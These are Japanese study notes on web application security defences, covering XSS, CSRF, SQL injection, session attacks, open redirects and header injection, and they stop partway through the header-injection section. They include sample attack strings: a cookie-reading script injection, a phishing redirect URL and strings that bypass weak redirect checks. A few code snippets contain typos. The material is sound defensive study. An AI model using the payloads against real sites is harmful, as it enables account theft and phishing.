
サイバー攻撃について

長谷川陽介さんの「教科書に載らないWebアプリケーションセキュリティ」　https://atmarkit.itmedia.co.jp/fcoding/index/webapp.html

------------------------------------------------------------------

★　表示処理に伴う脆弱性

◎　XSS（クロスサイトスクリプティング）
・概要
攻撃者はインターネット掲示板などの動的なWebサイトにある入力フォームにワナ（脆弱性のあるサイトへ誘導するスクリプトを含んだリンク）を設置する。
リンクをクリックしてこのようなサイトに誘導されると、ユーザーのブラウザ上で不正なスクリプトが実行され、
入力した情報やCookieなどが攻撃者へ漏えい、マルウェアへの感染、なりすましなどの被害が発生する。

・原因
入力値が制限されていなかったり、入力したスクリプトをそのまま実行できる状態にあり、攻撃者が容易に不正なスクリプトを入力できてしまうことがあげられる。

・種類
　1．Reflected XSS（反射型XSS）
　　　攻撃者は偽メールや偽サイトに不正なスクリプトを含んだリンクを用意し、脆弱性のあるWebサイトに誘導する（リクエストさせる）ことで
　　　ユーザーのブラウザで不正なスクリプトを実行させ、情報の搾取やマルウェアのダウンロードを行う。

　2．Stored/Persistent XSS（格納型/蓄積型/持続型XSS）
　　　攻撃者はあらかじめWebアプリケーションに直接スクリプトを格納する。
　　　該当のページをユーザーが閲覧するたびに、不正なスクリプトが実行される。
　　　該当ページにアクセスするだけであるため、Reflected XSSと比べると
　　　ワナを仕掛けたWebサイトを準備したり、スクリプトを含んだリンクをメール送信したりしなくても攻撃が成立する点では効率的である。
    　WebメールやSNSなどが典型的な攻撃ターゲット。
      メリット：罠サイトに利用者を誘導する手間がかからないこと
      　　　　　注意深い利用者でも被害にあう可能性が高いこと

　3．DOM Based XSS
　　　Webブラウザで動作するJavaScript上のコードの脆弱性を悪用した攻撃で、サーバー側で攻撃用スクリプトが実行されるのではなく、
　　　クライアントのWebブラウザ上で不正なスクリプトが実行される。
　　　また、DOM Based XSSは静的なHTMLにおいてもJavaScriptが利用されていれば攻撃対象となる。
   　 HTML上には攻撃者が注入したJavaScriptが現れない攻撃。
      textメソッドを使うことで自動的にエスケープされて要素に追加される。
      実装例：
      <body>
      <script src="jquery-1.4.4.min.js"></script>
      こんにちは<span id="name"></span>さん
      <script type="text/javascript">
      if(document.URL.match(/name\=([^&]*/)) {
        var name = unescape(RegExp.$1);
        $('#name').text(name);
      }
      </script>
      </body>

・被害
　1．セッションハイジャック
　2．個人情報の流出
　3．Webページの改竄

・対策
　1．サニタイジング（エスケープ）処理をする
 　　・要素内容については「<」と「&」
   　・属性値についてはダブルクォートで囲い、「<」と「"」と「&」　をそれぞれエスケープする
　　  ブラウザで「<」という文字を表示させる場合は、文字参照により「&lt;」と記述（エスケープ）する必要がある。
     これを「<」のままHTMLを生成すると、ブラウザは「<」をタグの開始と解釈する。これを悪用したのがXSS攻撃。
　　　「<」や「””」といった区切りやタグなどの意味を持つ文字を意味を持たない文字列に置き換え無害化する行為である、
　　　サニタイジングを行うことでスクリプトが意図せずに挙動することを防ぐことができる。
   　　PHPではhtmlspecialchars関数で対策できる。
     　string htmlspecialchars(string $string, int $quote_style, string $charset)
       第1引数…変換対象の文字列　第2引数…引用符の変換方法　第3引数…文字エンコーディング
       
       引用符の変換
       変換前　　|　変換後　　|　ENT_NOQUOTES　|　ENT_COMPACT　|　ENT_QUOTES　|
       　 <         &lt;           〇　　　　　　　　〇　　　　　　    〇
        　>　　　　　&gt;           〇      　  　   〇               〇
          &         &amp;          〇              〇               〇
          "        &quot;          ×               〇               〇
          '        &#39;           ×               ×                〇
          
        ➡　要素内容　➡　$quote_styleはどれでもよい
        　　属性値　　➡　ダブルクォーテーションで囲み、$quote_styleはENT_COMPACT、もしくはENT_QUOTES

　2．バリデーション処理（入力値の制限）
　　　例えば、パスワード入力欄に「全角英数字の6文字」、電話番号入力欄に「数字のみ」などの制限を入れることで不正なスクリプトを入力させない。
　　　JavaScriptを使い、ブラウザ側で入力値の制限を行ってしまうと、ユーザー側がJavaScriptをオフにして不正なスクリプトを入力ができるため、必ずサーバー側で制限を実施する。
   
　3．WAFを設置する
　　　WAF（Web Application Firewall）はWebアプリケーションを対象とした攻撃を検知・防御するセキュリティ製品。
　　　自社においてオープンソースのシステムを利用していたり、CMSやフレームワークを使ってWebサイトを構築していたりする場合、
　　　全ての脆弱性修正に対応するのは限界があるため、WAFの導入は必要不可欠である。

　4．出力時はhttpやhttpsから始まるURLのみ許可する
　　　URLに「JavaScriptスキーム」や「dataスキーム」などが含まれている場合でも、クロスサイトスクリプティングのリスクが生じる。
　　　入力するリンク先のURLはhttpやhttpsから始まるもののみを許可する設定にすることで想定外の処理がされるリスクを防げる。
   
  5．クッキーにHttpOnly属性を付与する　
  　　この属性はJavaScriptからのクッキーの読み出しを禁止するというもの。
    　セッションIDの盗み出しには効果があるが、その他の攻撃には有効ではない。
      これはphp.iniに「session.cookie_httponly = On　」と追加することでできる。

　6．TRACEメソッドの無効化
 　　　クロスサイトトレージング（XST）という攻撃の対策。
    　　XST…JavaScriptによりHTTPのTRACEメソッドを送信することでクッキー値やBasic認証のパスワードを盗む方法。
      　XSS攻撃を完全に解消できれば、問題はない。
        最近のブラウザではXST対策がなされている。
        TRACEメソッドの無効化はhttpd.confに「TraceEnable　Off」と追加する。
        
  7．URLを生成する際の対策
  　　URLをプログラムで作成する場合はhttpスキームとhttpsスキームのみを許可するようにチェックする必要がある。
    　具体的にはURLとしては以下のいずれかのみを許容するようにチェックする。
     　・http:　または　https:　で始まる絶対URL
       ・スラッシュ「/」で始まる相対URL
       チェックする関数
       function check_url($url){
            if(preg_match('/\Ahttp:/', $url) ||
               preg_match('/\Ahttps:/', $url) ||
               preg_match('#\A/#', $url)) {
                return true;
            }else{
                return false;
            }
        }
        
  8．リンク先ドメインのチェック
  　　リンク先として任意のドメインのURLを指定できる場合、利用者が気付かない内に罠のサイトに誘導され、
    　フィッシングの手法で個人情報等を入力させられる可能性がある。
     　対策
       ・リンク先を検証してURLが外部ドメインである場合はエラーにする
       ・外部ドメインへのリンクであることを利用者に注意喚起するためのクッションページを表示する
       
  9．イベントハンドラのXSSはJSをエスケープする必要がある
  　　JSを動的生成するケースでは入力パラメータ中のシングルクォート「'」がデータとしての文字「'」ではなく、
    　JSの文字列の終端に使われてしまうことが原因で脆弱性が発生する。
       対策
     　・データをJavaScript文字列リテラルとしてエスケープする
       ・この結果をHTMLエスケープする
       
       JavaScriptの文字列リテラルとしてエスケープすべき文字
       　文字　　　|　エスケープ後
        　\           \\
          '           \'
          "           \"
         改行         \n
         
         そのため入力に「<>'"\」が与えられた場合は以下の様にエスケープする必要がある。
         　元入力　<>'"\　➡　JavaScriptエスケープ後　<>\'\"\\　➡　HTMLエスケープ後　&lt;&gt;\&#39;\&quot;\\

　10．script要素のXSS
 　　　入力中に「</script>」が含まれている場合、そこでJavaScriptのソースの終端となり、
    　　再度「<script>alert(document.cookie)//」などと入れることでXSS攻撃が可能である。
      
  11．JavaScriptの動的パラメータ生成時の対策
  　　1．Unicodeエスケープによる対策
    　　英数字以外をすべてエスケープする手法で、UnicodeコードポイントU+XXXXの文字を\uXXXXという形でエスケープする機能を利用する。
      　Unicodeエスケープする関数escape_js_stringは文字エンコーディングがUTF-8であることが前提だが、
        英数字に加えてマイナス記号「-」とピリオド「.」をエスケープしない仕様になっている。
        実装例：
        <?php 
         // 文字列を全て\uXXXX形式に変換する
         function unicode_escape($matches){
            $u16 = mb_convert_encoding($matches[0], 'UTF-16');
            return preg_replace('/[0-9a-f]{4}/', '\u$0', bin2hex($u16));
         }
         // 英数字とマイナス、ピリオド以外を\uXXXX形式でエスケープする
         function escape_js_string($s){
            return preg_replace_callback('/[^-\.0-9a-zA-Z]+/u', 'unicode_escape', $s);
         }
         ?>
         
         スクリプトの説明
         ・unicode_escape関数は入力文字列をすべて\uXXXXというUNICODE形式でエスケープする
         ・mb_convert_encodingで入力をUTF-16でエンコーディングする
         ・bin2hexで16進数文字列に変換する
         ・正規表現により4バイト毎に「\u」を挿入する
         ・escape_js_string関数は入力文字列の中から、英数字以外を\uXXXX形式でエスケープする
         ・preg_replace_callback関数により英数字以外からなる文字列をunicode_escape関数に引き渡す
         
      2．script要素の外部でパラメータを定義して、JavaScriptから参照する方法
      　　hiddenパラメータを利用する。
        　実装例：
          <input type="hidden" id="familyname" value="<?php echo htmlspecialchars($familyname, ENT_COMPACT, 'UTF-8'); ?>">
          ...
          <script type="text/javascript">
          var familyname = document.getElementById('familyname').value;
          //..
          
          2行目で値を設定する際に属性値に対するエスケープ原則に従い、htmlspecialchars関数でエスケープした値をダブルクォートで囲んでいる。
          そのinputの値をgetElementByIdメソッドにより参照している。


◎　CSRF（クロスサイトリクエストフォージュリ）
・概要
　「重要な処理」の脆弱性があるとクロスサイトリクエストフォージェリが生じる可能性がある。
 　重要な処理…クレジットカードでの決済、利用者の口座からの送金、メール送信、パスワードやメールアドレスの変更
  重要な処理の受付に関しては、利用者の意図したリクエストであることを確認する必要があるが、
  この確認処理が抜けていると、罠のサイトなどを閲覧しただけで利用者のブラウザから勝手に重要な処理を実行させられることがある。
  WebアプリケーションにCSRF脆弱性がある場合の影響
  ・利用者のアカウントによる物品の購入
  ・利用者の退会処理
  ・利用者のアカウントによる掲示板への書き込み
  ・利用者のパスワードやメールアドレスの変更
  

・原因
　脆弱性が生まれる背景に以下のWebの性質がある。
　1．form要素のaction属性にはどのドメインのURLでも指定できる
 　　罠などのサイトからでも攻撃対象サイトにリクエストを送信できること。
　2．クッキーに保管されたセッションIDは、対象サイトに自動的に送信される
　　 罠経由のリクエストに対しても、セッションIDのクッキー値が送信されるため、認証された状態で攻撃リクエストが送信されるということ。
   
   通常のWebアプリケーションではRefererの値をチェックしないため、アプリケーション開発者が意識して、
   正規利用者の意図したリクエストであることを確認しない限り、区別されないため、CSRF脆弱性の可能性がある。
   また、クッキー以外にも自動的に送信されるパラメータを使ってセッション管理しているサイトにはCSRF脆弱性の可能性がある。
   具体的にはHTTP認証、SSLクライアント認証、携帯電話の携帯IDによる認証を利用しているサイトも攻撃の影響を受ける可能性がある。
 

・対策
　設計段階から対策を盛り込む必要がある。
　主に「重要な処理」とされるリクエストが正規利用者の意図したものであることを確認する必要がある。
 
 ・CSRF対策の必要なページを区別する
 　CSRF攻撃は全てのページで対策する必要はない。
　 例えばECサイトであれば、商品カタログページは外部からリンクされることが好ましく対策の対象ではない。
   一方、購入ページやパスワード変更、個人情報編集などは勝手に実行されると困るため、対策が必要である。
   
   開発プロセスで以下の様にする。
   1．要件定義工程で機能一覧を作成し、CSRF対策の必要な機能にマーク
   2．基本設計工程で画面遷移図を作成し、CSRF対策の必要なページにマーク
   3．開発工程でCSRF対策を作りこむ
   
 ・正規利用者の意図したリクエストを区別できるよう実装する
 　CSRF対策として必要なことは正規利用者の意図したリクエストであることの確認である。
   正規利用者の意図したリクエストとは、対象のアプリケーションの画面上で正規利用者が自ら実行ボタンを押した結果のリクエストである。
   正規サイト　➡　正規のサイトのボタン押下によるリクエストは、正規利用者の意図したリクエストとみなせる。
   罠サイト　　➡　罠のサイトを閲覧しただけで送信されるリクエストは正規利用者の意図したリクエストではない。
   具体的に見極める方法
   1．秘密情報（トークン）の埋め込み
   2．パスワード再入力
   3．Refererのチェック
   
   1．秘密情報（トークン）の埋め込み
   　トークンとは、第三者が知り得ない秘密情報のこと。
     トークンを簡便且つ、安全に実装する方法として、セッションIDをトークンとして利用可能である。
     トークン埋め込み実装例：
     <form action="chgpwddo.php" method="POST">
        新パスワード<input name="pwd" type="password"><br>
        <input type="hidden" name="token" value="<?php echo htmlspecialchars(session_id(), ENT_COMPAT, 'UTF-8'); ?>">
        <input type="submit" value="パスワード変更">
     </form>
     
     トークン確認の実装例：
     session_start();
     if(session_id() !== $_POST["token"]){
        die("正規の画面からご使用ください"); 
     }
     // 以下、重要な処理の実行
     
     入力ー確認ー実行のように3段階の遷移がある場合でも、トークンを埋め込むページは実行ページの直前のページである。
     また、トークンはPOSTで受け取る必要がある。
     
   　・ワンタイム・トークンについて
    　　ワンタイム・トークン　➡　使い捨てのトークンであり、必要になる度に異なる値を生成する。生成には暗号論的擬似乱数生成器を使う。
      　ワンタイム・トークンを使う典型的なケースはリプレイ攻撃対策が必要な場合である。
        リプレイ攻撃　➡　暗号化されたリクエストを盗聴してその内容を丸ごと再送する成りすまし攻撃のこと。
        本書ではワンタイム・トークンを推奨しない。
        1．CSRF攻撃は盗聴やリプレイ攻撃とは無関係であり、ワンタイム・トークンを用いる必然性がない。
        2．ワンタイム・トークンがセッションIDそのものをトークンとする方法に比べて安全になる根拠がない。
        3．ワンタイム・トークンを用いることで正当な操作までエラーになる場合がある。
 
 　2．パスワード再入力
 　　パスワードの再入力を求めることで利用者の意図したリクエストであることを確認できる。
   　また、次の目的でも使われる。
   　1．物品の購入などに先立って、利用者の意思を念押しして確認する
   　2．共有PCで別人が操作している状況などがなく、本当に正規の利用者であることを確認する
    いずれも最終の実行ページで行うように実装する。
    
  3．Refererのチェック
  　「重要な処理」を実行するページでRefererをチェックする。
  　実装例：
   if(preg_match('#\Ahttp://example.jp/45/45-002ch.php#', @$_SERVER['HTTP_REFERER']) !== 1){
        die('正規の画面から実行してください');
   }
   
   最も手短に対策ができる反面、RefererのチェックはRefererを送信しないように設定している利用者には実行できないという欠点がある。
   パーソナルファイアウォールやブラウザのアドオンソフトなどでRefererを抑止している、そもそも送信されない（古いiモードの携帯など）場合がある。
   そのため、Refererのチェックで対策を行うのは社内用のシステムなどに限るべきである。
   
   
・保険的対策
　重要な処理の実行後に利用者に処理内容の通知メールを送信することが推奨される。
　CSRFだけでなくXSSに対しても有用で防ぐことはできないが、早期に発見することで被害を最小限に抑えることができる。
   

・CSRFとXSSの比較
攻撃に至るシナリオが似ており、攻撃の影響が一部重なるため、混同しやすいが、別物である。
シナリオを以下に示し、違いを見る。
1．被害者が攻撃者の罠サイトを閲覧
2．仕掛けのあるHTMLがブラウザに返される
3．攻撃用リクエストが正規のサイトに送られる
4．仕掛けを含むレスポンスが正規のサイトからブラウザに返される
CSRFは3.のリクエストに対するサーバー側の処理を悪用するもの。
XSSは3.のリクエストに含まれるスクリプトはオウム返しに4.のレスポンスとして返され、
それがブラウザ上で実行されることで攻撃が起こる。ブラウザ上でできることは何でもできるため、
JavaScriptを使ってサーバー側の機能を悪用することもできる。


-----------------------------------------------------------------------------------------------------------

★　SQL呼び出しにおける脆弱性

◎　SQLインジェクション
・概要
　　SQLの呼び出し方に不備がある場合に発生する脆弱性。
 　・データベース内の全ての情報が外部から盗まれる
   ・データベースの内容が書き換えられる
   ・認証を回避される（IDとPASSを使わずにログインされる）
   ・その他、データベースサーバー上のファイルの読み出し、書き込み、プログラムの実行など

・攻撃の種類
　1．UNION SELECTを用いた情報漏洩
  2．SQLインジェクションによる認証回避
  3．SQLインジェクション攻撃によるデータ改ざん
  4．その他の攻撃
  　　・OSコマンドの実行
    　・ファイルの読み出し、書き出し
    　・HTTPリクエストのより他のサーバーを攻撃

・原因
　リテラルの扱いに原因がある。
　リテラルとはSQL中で決まった値を示すもので、文字列リテラルと数値リテラルが頻繁に利用される。
　SQLの標準規格では文字列リテラルをシングルクォートで囲み、文字列リテラル中にシングルクォートを含む場合は
　シングルクォートを重ねる決まりである。
　SQL脆弱性のあるプログラムはこのシングルクォートを重ねる処理が抜けているため、
　最初のシングルクォートで文字列リテラルが終了され、その後に悪意のあるSQLを注入されて攻撃が発生する。
　数値リテラルも同様に数字以外が入るとリテラルが終了する。
　例えば「;」が入った後に悪意のあるSQLで攻撃される。

・対策
　1．プレースホルダによりSQL文を組み立てる
　2．アプリケーション側でSQL文を組み立てる際に、リテラルを正しく構成するなど、SQLが変更されないようにする
 　2は完全な対応が難しいため、1の方法が良い。
  
  プレースホルダ
  ・2種類のプレースホルダ
  　1．静的プレースホルダ
   　　値のバインドをデータベースエンジン側で行う。
     　プレースホルダのついたSQL文はそのままデータベースエンジンに送られ、コンパイルなどの実行準備が行われ、SQL文が確定する。
　　　　バインド値がデータベースエンジンに送られ、エンジン側で値を当てはめた後にSQL文が実行される。

　　2．動的プレースホルダ
  　　　SQLを呼び出すアプリケーション側のライブラリ内でパラメータをバインドしてデータベースエンジンに送る。
　　　　バインドにあたりリテラルは適切に構成されるため、処理系にバグが無ければSQLインジェクションは発生しない。
    
    どちらかといえば静的プレースホルダが優れているため、そちらを使うべき。
    
 ・検索条件が動的に変わる場合のプレースホルダ対策
 // 基本となるSQL
 $sql = 'SELECT id, title, author, publisher, date, price FROM books';
 if($title !== ''){  // 検索titleの追加（LIKE)
     $conditions[] = "title LIKE ? ESCAPE '#'";
     $ph_type[]    = 'text';
     $ph_value[]   = escape_wildcard($title);
 }
 if($price !== ''){  // 検索条件priceの追加（大小比較）
     $conditions[] = "price <= ?";
     $ph_type[]    = 'integer';
     $ph_value[]   = $price;
 }
 if(count($conditions) > 0){  // WHERE句がある場合
     $sql .= ' WHERE ' . implode(' AND ', $conditions);
 }
 $smt = $mdb2 -> prepare($sql, $ph_type);  // SQL文の準備
 $rs  = $stmt -> execute($ph_value);  // バインド・問い合わせ実行
 

・ ORDER BY 句
　ORDER　BY 句の後もセミコロンで第二SQLを実行できる。
  対策として　ソート列名の妥当性確認を行う方法がある。
  例：
  $sort_columns = array('id', 'author', 'title', 'price');
  $sort_key = $_GET['sort'];
  if(array_search($sort_key, $sort_columns) !== false){
     $sql .= ' ORDER BY ' . $sort_key;
  }
  
  
・保険的対策
　1．詳細なエラーメッセージの抑止
  2．入力値の妥当性検証
  3．データベースの権限設定
  

    
・参考
　a.ワイルドカードのエスケープ
 　%などのワイルドカードを検索したい文字列として加えるにはエスケープする必要がある。
 　例：「#」を用いてエスケープする
  　WHERE name LIKE '%#%%' ESCAPE '#'
   「#%」で%を意味する
   関数例：
   function escape_wildcard($s){
        return mb_ereg_replace('([_%#])', '#\1', $s);
   }
   
   mb_ereg_replace()
   第一引数に変換するターゲットの正規表現パターン
   第二引数に変換後の文字列
   第三引数に対象文字列
   第四引数にオプション
        　i …大文字・小文字が 区別されなくなる
　        x …空白を無視
　        m …マルチラインモード。改行も 正規表現"." に含まれる。
　        p …POSIX モード。改行も通常文字とみなされる
　        e …文字列引数 $replacement がPHPの式として評価される
         

  b.PHP+PDO+MySQLの安全な接続方法
  　PDOはデータベース接続時に文字コードを指定する方法が用意されていないため、
    MySQLの設定ファイル名を指定する方法で文字コードを指定する。
    例：
    $dbh = new PDO('mysql:host=localhost;dbname=wasbook', 'username', 'password', 
                    array(
                        PDO::MYSQL_ATTR_READ_DEFAULT_FILE => '/etc/mysql/my.cnf',
                        PDO::MYSQL_ATTR_READ_DEFAULT_GROUP => 'client',
                        PDO::ATTR_EMULATE_PREPARES => false,
                    ));
     更に/etc/mysql/my.cnf（MySQLの設定ファイル）に次の設定を追加する。
      [client]
      default-character-set=utf8


-----------------------------------------------------------------------------------------------------------

★　セッションにおける脆弱性

◎　セッションハイジャック
・概要
　何らかの原因で利用者のセッションIDが第三者に知られて、成りすましてアクセスされて悪用されること。
　セッションIDを第三者が知る方法は以下の3種類である。
　1．セッションIDの推測
 　　セッションIDの生成方法が不適切な場合、推測されてハイジャックされる。
   　連番や日時、ユーザーIDを元にセッションIDを生成している、オープンソースなソフトウェアで生成ロジックが公開されている場合など。
     攻撃対象：アプリケーション　自作セッション管理機構の脆弱性
     　　　　　ミドルウェア　　　ミドルウェアの脆弱性
          
    ・攻撃手法と影響
    　攻撃は次の3ステップで行われる。
      1．対象アプリケーションからセッションIDを集める
      2．セッションIDの規則性の仮設を立てる
      3．推測したセッションIDを対象アプリケーションで試す
      
      ありがちなセッションID生成方法
      ・ユーザーIDやメールアドレス
      ・リモートIPアドレス
      ・日時（UNIXタイムの数値、あるいは年月日時分秒の文字列）
      ・乱数
      
      ユーザーIDや日時は外部から推測可能な元データのため、脆弱性の原因になる。
      攻撃者は推測したセッションIDで攻撃し、成功したら成りすましができる。
      成りすましができてもパスワードはわからないため、重要な処理前のパスワードの再入力は保険的な対策になる。
      
    
　2．セッションIDの盗み出し
 　　盗み出す方法。
  　 ・クッキー生成の際の属性の不備により漏洩
     ・ネットワーク的にセッションIDが盗聴される
     ・クロスサイトスクリプティングなどアプリケーションの脆弱性により漏洩
     ・PHPやブラウザなどプラットフォームの脆弱性により漏洩
     ・セッションIDをURLに保持している場合、Refererヘッダから漏洩
     脆弱性の典型例
     ・クロスサイトスクリプティング
     ・HTTPヘッダ・インジェクション
     ・URLに埋め込まれたセッションID
     攻撃対象：アプリケーション　 XSS脆弱性（XSS）
     　　　　　                 HTTPヘッダ・インジェクション脆弱性（HTTPヘッダインジェクション）
                          　　 URL埋め込みのセッションID（Refererの悪用）
   　　　　　　ミドルウェア　　  ミドルウェアの脆弱性（アプリケーションと同様）
         　　　ネットワーク　　  クッキーのセキュア属性不備ほか（ネットワーク盗聴）
            
     a.URL埋め込みのセッションID
     　セッションIDをクッキーに保存せずにURLに埋め込まれている場合、
       Refererヘッダを経由してセッションIDが外部に漏洩し、なりすましの原因になる。
       PHP、Java、ASP.NET、ドコモの携帯電話ブラウザなど。
       
       ・攻撃手法と影響
       PHPの設定でセッションIDの管理を変更する。
       php.iniの設定項目
       session.use_cookies　セッションIDの保存にクッキーを使う　デフォルトで有効
       session.use_only_cookies　セッションIDをクッキーのみに保存する　デフォルトで有効
       session.use_trans_sid　セッションIDをURLに自動埋め込みする　デフォルトで無効
       
       ・refererによりセッションIDが漏洩する条件
       　1．URL埋め込みのセッションIDを使える
         2．外部サイトへのリンクがある。あるいはリンクを利用者が作成できる
         
       ・攻撃のシナリオ
       　意図的に攻撃を仕掛けることができるのは利用者がリンクを作成できる場合に限られる。
         具体的にはWebメール、掲示板、ブログ、SNSなどである。
         攻撃者がターゲットに対してURL付きのメールを送り、攻撃者のサイトへと誘導。
         ターゲットがサイトを閲覧するとWebメールのURLに埋め込まれていたセッションIDが攻撃者のサイトにRefererとして漏洩する。
         影響はセッションハイジャックと同等。
            
　3．セッションIDの強制（セッションフィクセーションの項へ）
　　　セッションIDを利用者のブラウザに設定することでセッションIDを知っている状態にすることでハイジャックを行う。
  　  セッションIDの固定化攻撃と呼ぶ。　
      攻撃対象：アプリケーション　セッションIDの固定化脆弱性（セッションIDの固定化攻撃）
 
 ・セッションハイジャックの影響
 　1．利用者の重要情報の閲覧
   2．利用者の持つ権限での操作
   3．利用者のIDによるメール、ブログなどへの投稿、設定の変更など
 

・原因
　1．セッションIDの推測の原因
 　　セッション管理機構を自作していること。
   　独自にセッション管理機構を作成する意味はない。
    　1．主要なWebアプリケーション開発ツールはセッション管理機構を備えている
    　2．安全なセッションID生成プログラムを開発することは技術的難易度が高い
  
  2．セッションIDの盗み出し
  
  　a.URL埋め込みのセッションIDの原因
  　　不適切な設定、あるいはプログラミングが原因。
    　意図的に設定するケースもあるが、基本的にセッションIDはクッキーに保存すること。
    　 

・対策
　1．セッションIDの推測の対策
   　現実的で効果的な対策は、Webアプリケーション開発ツールが備えるセッション管理機構を利用すること。
     どうしても自作する場合には、暗号論的擬似乱数生成器を基に十分な桁数のセッションIDを生成する。
     暗権論的擬似乱数生成器　➡　現実的な時間内に乱数値を予測することができないことを理論的に保証されている乱数。
     
     ・PHPのセッションIDのランダム性を改善する方法
     　PHPはデフォルト設定でMD⑤ハッシュ関数を通す方法でセッションIDを生成している。
       ・リモートIPアドレス
       ・現在時刻
       ・乱数（暗号論的擬似乱数生成系ではない）
       これらの組み合わせでセッションIDを生成しており、これは安全性が保証されていない設計である。
       php.iniに以下の設定を行うことで安全な乱数を元にセッションIDを生成できる。
       [Session]
       ;; entropy_file　は　Windowsでは設定不要
       session.entropy_file = /dev/urandom
       session.entropy_length = 32
       
       /dev/urandomはLinuxなどの多くのUnix系OSで実装されている乱数生成器である。
       
　2．セッションIDの盗み出し
 　　a.URL埋め込みのセッションIDの対策
   　　・PHPの場合
        [Session]
     　 session.use_cookies = 1
      　session.use_only_cookies = 1
       
      ・ASP.NETの場合
      <?xml version="1.0" encoding="UTF-8" ?>
      <configuration>
        <system.web>
            <sessionState cookieless="false" ?>
        </system.web>
      </configuration>


◎　セッションフィクセーション
・概要
　外部からセッションIDを強制することで成りすまし攻撃をする。
　手順
　1．セッションIDを入手する
　2．ターゲットに対して1のセッションIDを強制する
　3．ターゲットが標的アプリケーションにログインする
　4．攻撃者はターゲットに強制したセッションIDを使ってログインする

　ターゲットのセッションIDを強制することで攻撃者はそのセッションIDを使えば、ページにログインした状態になる。

　・クッキーのみにセッションIDを保存するサイトのセッションフィクセーション
　　クッキーのセッションIDを外部から設定することは通常不可能であるが、アプリケーションに脆弱性があれば可能になる。
  　・クッキーモンスター問題
  　・クロスサイトスクリプティング脆弱性
  　・HTTPヘッダ・インジェクション脆弱性

・原因
　セッションIDを外部から設定できること。
　以下の対策を行えば基本的には防げることである。
　1．セッションIDをURL埋め込みにしない
　2．クッキーモンスター問題のあるブラウザを使わない（使わせない）
　3．クッキーモンスター問題の発生しやすい地域型ドメインを使わない
　4．クロスサイトスクリプティング脆弱性をなくす
　5．HTTPヘッダインジェクション脆弱性をなくす
　6．その他クッキーを書き換えられる脆弱性をなくす
　ただし、これらをすべて行うのは不可能なため、セッションフィクセーションが発生してもセッションハイジャックを防ぐのが一般的。

・対策
　1．認証後にセッションIDを変更する
　PHPの場合
　bool session_regenerate_id([bool $delete_old_session = false])
　第一引数　➡　変更前のセッションIDに対応するセッションを削除するかどうか。基本trueにする。
 
　2．セッションIDが変更できない場合はトークンにより対策する
　ログイン時にトークンを生成し、クッキーとセッション変数の両方に記憶させる。
　各ページの認証確認時にクッキー上のトークンとセッション変数のトークンの値を比較し、同一である場合のみ認証されていると判断する。
　トークンが外部に出力されるのはログイン時のクッキー生成のみのため、攻撃者にとっては未知の情報である。
 
　・ログイン前のセッションフィクセーションの対策
　　ログイン前にセッション変数を使っているとセッションフィクセーションを防ぐのは不可能。
　　保険的対策として、
　　・ログイン前のセッション変数には秘密情報を格納しない
　　・URL埋め込みのセッションIDを使わない
　　・地域型ドメインを使わない
 

・セッションアダプション
　未知のセッションIDを受け入れるという特性。
　PHPやASP.NETはこの特性を持っている。
　セッションアダプションが無くてもセッションフィクセーションが防げるわけではないが、
　攻撃者の攻撃手順が増えることにはなる。（有効なセッションIDを取得するという手順が増える）


-----------------------------------------------------------------------------------------------------------

★　リダイレクト処理における脆弱性

◎　オープンリダイレクタ脆弱性
・概要
　リダイレクタ　➡　ログインページのパラメータにURLを指定しておき、ログイン後にそのURLにリダイレクトする機能。
　リダイレクタの中で任意のドメインにリダイレクトできるものをオープンリダイレクタという。
　オープンリダイレクタは利用者が知らないうちに別ドメインに遷移する場合、フィッシングという詐欺に悪用される可能性がある。
　フィッシング　➡　著名なWebサイトなどを偽装したサイトに利用者を誘導して、個人情報などを入力させる手口。
　利用者が信頼しているドメインにオープンリダイレクタ脆弱性があると、注意深い利用者でも個人情報を入力する可能性が高い。
　また、プログラムなどをダウンロードするサイトに脆弱性があると、マルウェアを配布される可能性がある。
 
　・攻撃手法と影響
　　1．ログイン画面に飛ぶ正規のURLに罠サイトへ誘導するパラメータを付けて、利用者にメールなどで閲覧するように仕向ける
  　　　http://example.jp/47/47-001.php?url=http://trap.example.com/47/47-900.php
　　2．アプリケーション側で正規の情報を入力してログインに成功するが、罠サイトに飛ばされる
　　3．罠サイトではログインエラーなどとして再度、ログイン情報を入力させる（ターゲットは間違えたかと思うだけ）
　　4．入力された情報を攻撃者は収集し、その後正規の画面にリダイレクトすることで気づくこともなく攻撃終了
  
・原因
　・リダイレクト先のURLを外部から指定できる
　・リダイレクト先のドメインのチェックがない
　これは両方が成立したときに脆弱性になるため、どちらか一方を対策するだけで脆弱性はなくせる。
　
　・オープンリダイレクタが差し支えないケース
　　・もともと外部のドメインに遷移する仕様であること
　　・利用者にとって外部ドメインに遷移することが自明であること
  　これはバナー広告などで外部サイトに遷移することが自明である場合は脆弱性にはならない。

・対策
　根本的対策は以下のいずれかを実施すること。
　1．リダイレクト先のURLを固定する
　　　リダイレクト先URLを外部から指定するのではなく固定のURLに遷移する。
   
　2．リダイレクト先のURLを直接指定せず番号指定にする
　　　やむを得ずリダイレクト先を可変にする場合はURLをそのまま指定するのではなく、「ページ番号」の形で指定する。
  　　ページ番号とURLの対応表は外部から見えないスクリプトソースやファイル、データベースなどで管理する。
　　　クッションページをはさむ。
    
　3．リダイレクト先のドメインをチェックする
　　　リダイレクト先のURLのチェックにより、任意のドメインへの遷移を防止する。
　　　チェックは漏れが多いため、1,2を推奨する。
  　　失敗例：　　　　　　　　　　　　　　　　　　　　　　　　　         すり抜ける例：
  　　if(mb_ereg('example\.jp', $url)){ // チェックOK}　        ➡　http://trap.example.com/example.jp.php
　　　if(mb_ereg('^/', $url)){ // チェックOK} 　　　　　         ➡　//trap.example.com/47/47-900.php
　　　if(mb_ereg('^http://example\.jp/', $url)){ // チェックOK} ➡　HTTPヘッダ・インジェクションを防げない
 　　 正しい対策：
　　　if(mb_ereg('\Ahttps?://example\.jp/[-_.!~*\'();\/?:@&=+\$, %#a-zA-Z0-9]*\z', $url)){ // チェックOK}


◎　HTTPヘッダ・インジェクション
・概要
　リダイレクトやクッキー発行など、外部からのパラメータを元にHTTPレスポンスヘッダを出力する際に発生する脆弱性。
　レスポンスヘッダを出力する際のパラメータ中に改行を挿入する攻撃によって、被害者のブラウザ上で以下のどちらか、もしくは両方が発生する。
　1．任意のレスポンスヘッダの追加
　2．レスポンスボディの偽造
 
　・影響
　　・任意のクッキーの生成
　　・任意のURLへのリダイレクト
　　・表示内容の改変
　　・任意のJavaScript実行によるXSSと同様の被害
  
  ・攻撃手法
  　1．パラメータに罠サイトのURLを入れておく（チェックを抜けるために最初に正当なLocationヘッダ情報を入れ込む）
